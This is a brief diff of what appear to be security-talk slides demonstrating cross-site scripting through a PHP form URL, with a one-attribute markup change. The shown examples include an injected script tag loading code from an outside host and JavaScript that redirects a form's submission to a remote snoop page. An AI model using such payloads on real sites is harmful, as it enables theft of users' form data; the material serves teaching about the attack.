@@ -27,7 +27,7 @@
 <example title="Decoded" fontsize="1.5em"><![CDATA[http://localhost/form.php/" method="POST">
 <script src="http://lerdorf.com/txss"></script><b a="]]></example>
 
-<example title="Remote Javascript" type="javascript" fontsize="1.6em"><![CDATA[function a(event) {
+<example title="Remote Javascript" fontsize="1.6em"><![CDATA[function a(event) {
   document.forms[0].action = "http://lerdorf.com/snoop.php";
 }
 function addLoadEvent(func) {
